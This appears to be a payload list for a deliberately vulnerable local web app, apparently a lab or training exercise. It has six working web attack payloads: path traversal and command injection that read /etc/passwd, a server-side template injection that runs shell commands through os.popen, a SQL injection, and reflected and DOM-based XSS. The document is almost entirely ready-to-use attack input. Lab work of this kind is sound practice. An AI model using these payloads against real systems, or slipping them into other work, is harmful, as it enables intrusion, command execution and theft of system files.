1. Path traversal:

Payload:

```bash
http://127.0.0.1:5000/image?filename=/etc/passwd
```

2. File non-sanitization:

Payload:

```bash
curl -X POST \
     -d "filename=dummy.pdf; cat /etc/passwd" \
     http://127.0.0.1:5000/run-script
```

3. SSTI:

Payload:

```bash
http://127.0.0.1:5000/render?content=%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('cat%20/etc/passwd').read()%7D%7D
```

4. SQL injection

Payload

```bash
http://127.0.0.1:5000/logs?query=1=1--
```

5. Reflected XSS

Payload

```bash
http://127.0.0.1:5000/xss?input=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
```

6. DOM-based XSS

Payload

```bash
http://127.0.0.1:5000#<img src%3Dx onerror%3Dalert(1)>
```
